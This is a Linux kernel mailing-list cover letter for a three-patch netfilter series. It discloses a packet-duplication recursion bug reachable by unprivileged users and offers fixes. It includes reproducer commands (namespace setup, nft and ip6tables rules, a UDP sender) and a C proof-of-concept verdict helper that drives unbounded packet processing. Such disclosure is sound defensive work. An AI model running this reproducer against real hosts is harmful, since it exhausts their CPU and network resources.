Received: from mail-pj1-f53.google.com (mail-pj1-f53.google.com [209.85.216.53])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3480C49E12B
	for <netfilter-devel@vger.kernel.org>; Thu, 15 Oct 2026 07:45:01 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.53
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1792050307; cv=none; b=NBb19COA/mmAA3rKgsQUKBtIOq2WEF206lBNgSU7Tr1uujxGWSNL9HI856kc3tfASxg2ZBw8jBssHDSRKH1BPpaqnC9rngqnwIx89jn6KazHmOKzLQTfu57t0ofdGqepuwPEBrai6Llw9uoLFfFcv0Ol65+GuCvqCFDwS0EdIis=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1792050307; c=relaxed/simple;
	bh=idWN7cBcsaFBF247ym2WF7oMSLDflFPIND3hmNaYCa8=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=MOi42ueqQAwh+8DwfBmr46tDcShUiKUTk5EOSJ7HA0HLGa6KSC6qPknUvMBgZ00HeZyhVP7TmpvEGjn5qHis5fU7Ew20cfYIAWdd+Hfkr7Dw5FufYuPLgjjMWokEYrB58L0jH2fNfoSi+RsuHG86oPXDiKDDwKS+Ryteik5m29g=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=Iw50In6K; arc=none smtp.client-ip=209.85.216.53
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="Iw50In6K"
Received: by mail-pj1-f53.google.com with SMTP id 98e67ed59e1d1-3ac6794fe45so1153339a91.0
        for <netfilter-devel@vger.kernel.org>; Thu, 15 Oct 2026 00:45:01 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792050301; x=1792655101; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=MB3RHjkAvRQ8BWBg48t/sxWYHpkyDjwBGTNUPuir1DU=;
        b=Iw50In6KsDzaj3bgjCO/Sbfp/4agjgCWZL8y40cGa6FkHxFGvp3IG+xVewff1ORpd6
         mvR+NGCETuYpG9Mvu6iJyX/DjFSU1wX/y67E2VL5WsA2/9irB5/ffZAR8L9nIX5RSoFS
         TsNncW1UZKaR+E22cf1IGR6Du3N1SgRvnPxPPJoFgUZOGuDboOFCy/fVyBVwe+9Acspg
         qOWboNZPhFFC59n8Z4VXUwPW1nqlhVsNhRvRQDD+HbivTIf/PfzTwQw9JojJDt6wpK/s
         3PAl25viMYrQxLAPRZc+oQzGAItxOR/BT2LOgon8Z6FGZbzCzAYH4g6MXHxzVH1qJzMO
         /DqQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792050301; x=1792655101;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=MB3RHjkAvRQ8BWBg48t/sxWYHpkyDjwBGTNUPuir1DU=;
        b=uKyCLguAcu2yIr8hJJa6KsUCH5xksKOTaUzl5xeV7QJjkD6wgFzve1obrWsjTkOETZ
         37JyyMLK2pCIPm+z5tNSeezqczb45P/dh76P3Yc93PGBuwUGjOImVI3I+zV0nCa5d6mq
         WPu9GbLjISWWJsrzmASkPxfZNRCwbNS0prZjJAFl+y10ud9jPvxHkT7HEmRXXP4Q3oRl
         qkD84OsA380rlF4ORLRgWPqlNMfI4VNphBHYZ2jPziyEYpXhPPP1hkUZiI9hk9H7UqHg
         Y6VgOlafgpUHA6l8CxL2UkywoFMxvqOtu1W/zlfPP42uxwRshuJyt755y2s+0i4SMaWP
         rSWw==
X-Gm-Message-State: AFq9FYJfk2DS8QT2L5Zj1anHeQwAVW/2cN8lQ8WjRgurDNL7PzJPzlQk
	/NKjQKSPHQTSc+7ipFcV5dZnFgKfijczrKGr/hlf/ike+1A0cUhHM15oBcdso6ipe11fMD2cONA
	2WgOm2w==
X-Gm-Gg: AYBFou3/NtrZ5JgdPO1Yx0sCqQau34WTze8aOKDFWFX7IZqjzTSZHUuDFzOvOo5h4SZ
	U+/RFwEc5YqVq4NweOcl59OAzcz4rJiM4hL4aFoR5g8rcNJNhNBY7x0usW9041auYxaycEMUJbo
	WIX74vKOWhgFABQsDL8PB7dZ8LjsOwJ+1PRIp0M1rjm0EHO8Xol3gg6KTpioPH5MRt5fA+BNstf
	0PGssSdyE9n1wVx1qMH99BuywJ4l/6THbDZ3PHy7vnJ42d7NucbLsru1OfGVEJA/gYu4SuxeAaB
	hVrCRO7oxol4sWek5cEvarL1+ktTF6y2snEWO/lLi9CXX5999fqV29rb2F2nVgkxnEi9mMd6O+x
	pByQW9aDzBreUjT8SCICQB1wYgjkxI+a3TnNQetGMGjj2jcNgrHbxSFCZw9oU+nfSdVDSaYtADD
	GIzF61cXtKbwW2YybaPQ97flxlzY8OiB2WGtq/QjVOsNV4xNCbRu3bdth+SxVkwAhTSCWDzKhy2
	mgtn2uX1DF7ZMON+JQWOBJRbTb2MQ==
X-Received: by 2002:a17:90b:4d0b:b0:3ab:1285:dfd6 with SMTP id 98e67ed59e1d1-3ac6f2952e2mr4157445a91.38.1792050300873;
        Thu, 15 Oct 2026 00:45:00 -0700 (PDT)
Received: from 24c857d0c3be.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3ac93849da5sm1636831a91.4.2026.10.15.00.44.50
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 15 Oct 2026 00:44:59 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netfilter-devel@vger.kernel.org,
	virtualization@lists.linux.dev,
	intel-wired-lan@lists.osuosl.org,
	bpf@vger.kernel.org
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	kaber@trash.net,
	jengelh@medozas.de,
	andrew+netdev@lunn.ch,
	mst@redhat.com,
	jasowangio@gmail.com,
	eperezma@redhat.com,
	xuanzhuo@linux.alibaba.com,
	aleksander.lobakin@intel.com,
	ast@kernel.org,
	daniel@iogearbox.net,
	hawk@kernel.org,
	john.fastabend@gmail.com,
	sdf@fomichev.me,
	magnus.karlsson@intel.com,
	maciej.fijalkowski@intel.com,
	willemb@google.com,
	alice.kernel@fastmail.im,
	eilaimemedsnaimel@gmail.com,
	imv4bel@gmail.com,
	shiming.cheng@mediatek.com,
	sd@queasysnail.net,
	vega@nebusec.ai,
	root@tr0jan.top,
	zihanx@nebusec.ai
Subject: [PATCH nf v8 0/3] netfilter: bound asynchronous packet duplication
Date: Thu, 15 Oct 2026 07:43:06 +0000
Message-ID: <cover.1792048855.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in netfilter packet duplication. The bug
is reachable by an unprivileged user in user and network namespaces.
Bounded tests exercised the fixes. Non-duplication packet semantics are
intended to remain unchanged. MIRRED flow offload for affected netdev dup
rules is rejected because it cannot enforce the duplication-depth limit.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

The IPv4 and IPv6 duplication helpers use a task-local guard while a cloned
packet traverses output hooks. If NFQUEUE suspends that traversal, the
output call can return and clear the guard before a later verdict resumes
the remaining hooks. The resumed packet can reach another duplication
consumer without the original guard. This can cause repeated packet
processing and consume CPU and network resources. Patch 1 records the
guard in the queue entry and restores it during reinjection. It keeps
bottom halves disabled during the reinjection traversal, restoring the
verdict task state before reenabling them.

The netdev nft dup path has a separate synchronous transmit recursion
counter. It does not accompany a duplicated skb through asynchronous
software receive paths. Patch 2 carries a bounded duplication depth through
skb and supported XDP conversions, resets it on reused buffers, and rejects
MIRRED flow offload where the software depth cannot be enforced. This scope
covers software skb/XDP continuity, not packet loops through physical
hardware or userspace device round trips.

At PRE_ROUTING and LOCAL_IN, the IPv4 and IPv6 helpers decrement TTL or
hop limit on the copy. Patch 3 stops creating copies when the value is
<= 1, so the decrement cannot reach zero or wrap a zero value to the
maximum. The three patches address the NFQUEUE reinjection, software
netdev receive, and ingress TTL/hop-limit paths, respectively. The patch
does not intend to change packet semantics for unrelated traffic; it also
rejects affected MIRRED flow offload because it cannot enforce the
netdev duplication-depth limit.

Validation:

The v8 series was built on nf.git main at
ab699d296e066eb64f51d2a8a1d42237a3b186c8 and booted in a 2-vCPU,
2-GiB QEMU guest as 7.3.0-rc5-g9a13bdbfd108. In bounded user/network
namespace runs, the IPv4 and IPv6 nft dup/NFQUEUE tests each completed
three callbacks with three successful verdicts and no verdict failures.
A separate IPv4 run sent three UDP datagrams and completed nine callbacks
with nine successful verdicts; the nft counters showed nine visits at
each configured dup rule. These are bounded validation runs.

For netdev dup, a native veth/XDP_TX-to-XDP_PASS test reached the
first four depth-coded rules once each and did not reach the next two.
The XDP_PASS control test without the transmit loop reached its single
dup rule four times. The IPv4 TTL test observed eight matching packets
and no TTL-0 or TTL-255 packets. The filtered IPv6 test observed eight
matching packets and no hop-limit-0 packets; its one hop-limit-255 count
was unrelated NDP traffic and is not evidence for the dup path. An IPv6
xt_TEE/NFQUEUE test ran in a non-initial user/network namespace: one UDP
datagram produced two callbacks, both accepted successfully. The guest
test setup used ip6tables-legacy and pre-created its xtables lock file
with mode 0666 so the unprivileged test process could open the lock.

An unpatched-baseline bounded run by an unprivileged user in user and
network namespaces reached 1,018,782 NFQUEUE callbacks in 61.643
seconds. The callback counter is incremented before nfq_set_verdict(),
so this is a callback count, not a successful-verdict count. This
observed repeated packet processing and resource consumption.

Reproducer:

    gcc -O2 -o nfq_accept poc.c -lnetfilter_queue
    unshare -Urn /bin/bash

The NFQUEUE trigger requires a userspace verdict process, while the netdev
test installs XDP programs and exercises veth skb/XDP conversion. Those
setup and verdict interactions are not expressible as a standalone
packetdrill exchange. The reproducer below covers the NFQUEUE path; the
separate bounded TTL/hop-limit and netdev/XDP validation results are
summarized above.

The following commands ran as an unprivileged user in a new user/network
namespace. First create a veth pair and assign 198.18.0.1/24 to v0 and
198.18.0.2/24 to v1, then bring both links up. Install these output hooks:

    nft add table ip t
    nft 'add chain ip t dup1 { type filter hook output priority raw; policy accept; }'
    nft 'add chain ip t queue1 { type filter hook output priority mangle; policy accept; }'
    nft 'add chain ip t dup2 { type filter hook output priority filter; policy accept; }'
    nft add rule ip t dup1 udp dport 5555 counter dup to 198.18.0.2 device v0
    nft add rule ip t queue1 udp dport 5555 queue num 0
    nft add rule ip t dup2 udp dport 5555 counter dup to 198.18.0.2 device v0

Start the verdict process in the background, send three UDP datagrams to
198.18.0.2 port 5555, then wait for the helper to exit:

    ./nfq_accept 1 4 &
    q=$!
    python3 -c 'import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); [s.sendto(b"x",("198.18.0.2",5555)) for _ in range(3)]'
    wait "$q"

The included helper returns NF_ACCEPT for each queued packet and reports
callback and verdict counts.

For the IPv6 xt_TEE test, the same helper was run in a non-initial
user/network namespace after creating a veth pair with fd00::1/64 on v0
and fd00::2/64 on v1. The guest test fixture pre-created
/run/xtables.lock with mode 0666 as guest root:

    touch /run/xtables.lock
    chmod 0666 /run/xtables.lock

The rules and one-packet trigger were:

    ip6tables-legacy -t mangle -A OUTPUT -p udp -m udp --dport 5556 -j TEE --gateway fd00::2
    ip6tables-legacy -t mangle -A OUTPUT -p udp -m udp --dport 5556 -j NFQUEUE --queue-num 0
    ./nfq_accept 1 6 &
    q=$!
    python3 -c 'import socket; s=socket.socket(socket.AF_INET6,socket.SOCK_DGRAM); s.sendto(b"x",("fd00::2",5556))'
    wait "$q"

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <unistd.h>
#define NF_ACCEPT 1
#define NF_DROP 0
#define NF_REPEAT 4
#define NF_STOP 5
#include <libnetfilter_queue/libnetfilter_queue.h>

static volatile sig_atomic_t stop;
static unsigned long callbacks, verdict_ok, verdict_fail, repeats, drops;
static const char *mode = "accept";
static struct nfq_q_handle *queue;
static void alarm_handler(int sig) { (void)sig; stop = 1; }
static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
              struct nfq_data *nfa, void *data)
{
    (void)nfmsg; (void)data;
    struct nfqnl_msg_packet_hdr *ph = nfq_get_msg_packet_hdr(nfa);
    if (!ph) return 0;
    uint32_t id = ntohl(ph->packet_id);
    callbacks++;
    if (!strcmp(mode, "slow")) usleep(100000);
    uint32_t verdict = NF_ACCEPT;
    if (!strcmp(mode, "repeat-first") && callbacks == 1) { verdict = NF_REPEAT; repeats++; }
    else if (!strcmp(mode, "drop")) { verdict = NF_DROP; drops++; }
    else if (!strcmp(mode, "stop")) verdict = NF_STOP;
    int rv = nfq_set_verdict(qh, id, verdict, 0, NULL);
    if (rv >= 0) verdict_ok++;
    else verdict_fail++;
    return 0;
}
int main(int argc, char **argv)
{
    int seconds = argc > 1 ? atoi(argv[1]) : 3;
    signal(SIGALRM, alarm_handler); alarm(seconds);
    int family = argc > 2 && atoi(argv[2]) == 6 ? AF_INET6 : AF_INET;
    if (argc > 2 && atoi(argv[2]) == 7) family = 7;
    if (argc > 3) mode = argv[3];
    struct nfq_handle *h = nfq_open();
    if (!h) { perror("nfq_open"); return 1; }
    if (nfq_unbind_pf(h, family) < 0) perror("nfq_unbind_pf");
    if (nfq_bind_pf(h, family) < 0) { perror("nfq_bind_pf"); return 2; }
    queue = nfq_create_queue(h, 0, cb, NULL);
    if (!queue) { perror("nfq_create_queue"); return 3; }
    if (!strcmp(mode, "slow") && nfq_set_queue_maxlen(queue, 1) < 0) { perror("nfq_set_queue_maxlen"); return 4; }
    if (nfq_set_mode(queue, NFQNL_COPY_PACKET, 0xffff) < 0) { perror("nfq_set_mode"); return 4; }
    int fd = nfq_fd(h); char buf[65536];
    while (!stop) {
        int n = recv(fd, buf, sizeof(buf), MSG_DONTWAIT);
        if (n >= 0) { nfq_handle_packet(h, buf, n); continue; }
        if (errno == EAGAIN || errno == EWOULDBLOCK) { usleep(1000); continue; }
        if (errno == EINTR) continue;
        perror("recv"); break;
    }
    printf("callbacks=%lu verdict_ok=%lu verdict_fail=%lu repeat=%lu drop=%lu", callbacks, verdict_ok, verdict_fail, repeats, drops);
    nfq_destroy_queue(queue); nfq_close(h);
    return verdict_fail ? 5 : 0;
}

------END poc.c--------

Changes in v8:
  - split the v7 NFQUEUE/netdev proposal into focused patches and add a
    third patch for the ingress TTL/hop-limit limit
  - preserve the IPv4/IPv6 recursion guard across NFQUEUE reinjection
  - bound netdev dup depth across software skb/XDP paths
  - stop IPv4 TTL and IPv6 hop-limit underflow before cloning
  - limit the netdev claim to software skb/XDP paths and document the
    MIRRED offload restriction
  - v7 Link:
    https://lore.kernel.org/all/cover.1791688819.git.zihanx@nebusec.ai/

Best regards,
Zihan Xi

Zihan Xi (3):
  netfilter: nf_dup: preserve guard across NFQUEUE reinjection
  netfilter: nf_dup_netdev: bound asynchronous duplication
  netfilter: nf_dup: prevent TTL and hop-limit underflow

 drivers/net/veth.c               |  3 +++
 drivers/net/virtio_net.c         |  3 +++
 include/linux/skbuff.h           |  9 +++++++++
 include/net/libeth/xdp.h         |  6 ++++--
 include/net/netfilter/nf_queue.h |  1 +
 include/net/xdp.h                | 25 +++++++++++++++++++++++++
 net/core/gro.c                   |  3 +++
 net/core/xdp.c                   | 10 ++++++++++
 net/ipv4/netfilter/nf_dup_ipv4.c |  3 +++
 net/ipv6/netfilter/nf_dup_ipv6.c |  3 +++
 net/netfilter/nf_dup_netdev.c    | 11 ++++++++++-
 net/netfilter/nf_queue.c         |  1 +
 net/netfilter/nfnetlink_queue.c  | 15 ++++++++++++---
 net/xdp/xsk_buff_pool.c          |  2 ++
 14 files changed, 89 insertions(+), 6 deletions(-)

-- 
2.43.0

